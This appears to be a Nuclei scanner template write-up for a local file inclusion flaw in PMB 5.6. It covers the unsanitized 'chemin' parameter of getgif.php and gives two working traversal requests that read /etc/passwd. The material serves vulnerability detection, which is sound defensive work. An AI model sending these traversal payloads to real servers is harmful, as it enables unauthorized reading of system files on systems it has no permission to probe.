# Nuclei Template: PMB 5.6 - Local File Inclusion
**Template ID:** pmb-directory-traversal
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`pmb-directory-traversal.yaml`)

## Vulnerability Information & PoC

## Description
PMB 5.6 is vulnerable to local file inclusion because the PMB Gif Image is not sanitizing the content of the 'chemin' parameter.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik
GET {{BaseURL}}/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik
```

## References
- https://packetstormsecurity.com/files/160072/PMB-5.6-Local-File-Disclosure-Directory-Traversal.html
